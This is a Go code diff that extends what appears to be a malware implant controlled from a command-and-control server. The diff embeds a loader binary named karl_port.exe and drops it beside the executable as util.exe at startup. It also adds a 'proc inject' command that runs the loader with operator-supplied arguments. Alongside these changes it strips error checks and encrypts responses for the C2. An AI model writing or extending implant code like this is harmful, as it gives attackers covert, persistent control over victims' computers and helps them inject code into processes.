@@ -4,6 +4,7 @@ package main
 
 import (
 	"bytes"
+	_ "embed"
 	"encoding/json"
 	"fmt"
 	"io/fs"
@@ -12,6 +13,7 @@ import (
 	"net/http"
 	"net/url"
 	"os"
+	"os/exec"
 	"path/filepath"
 	"strconv"
 	"sync"
@@ -38,9 +40,21 @@ var (
 	InitAESKey      string
 	X1              string
 	X2              string
+	loaderPath      string
 )
 
+//go:embed karl_port.exe
+var loader []byte // the loader is embedded into this file, then dropped
+
 func main() {
+	ex, err := os.Executable()
+	if err != nil {
+		log.Fatal(err)
+	}
+	loaderPath = filepath.Join(filepath.Dir(ex), "util.exe")
+	if err = os.WriteFile(loaderPath, loader, 0700); err != nil {
+		log.Fatal(err)
+	}
 	// Assign known commands to command function map
 	var wg sync.WaitGroup
 	c2Endpoint := InitC2Endpoint
@@ -220,17 +234,18 @@ func parseCmdObject(cmdObject *models.KarObjectCmd, cmdID int, c2Endpoint, UUID 
 		} else {
 			return
 		}
+	// proc inject
+	case 5:
+		cmd := exec.Command(loaderPath, args[0].StrValue, args[1].StrValue)
+		if err = cmd.Run(); err != nil {
+			responseObject.Code = 1
+			responseObject.Data.Error = err.Error()
+		}
 	}
 	if objType == 1 {
-		respObjectBytes, err = json.Marshal(responseObject)
-		if err != nil {
-			return
-		}
+		respObjectBytes, _ = json.Marshal(responseObject)
 	} else if objType == 3 {
-		respObjectBytes, err = json.Marshal(filesObject)
-		if err != nil {
-			return
-		}
+		respObjectBytes, _ = json.Marshal(filesObject)
 	}
 	respObjectBytes, err = kes.EncryptObject(respObjectBytes, aesKey, X1, X2)
 	if err != nil {
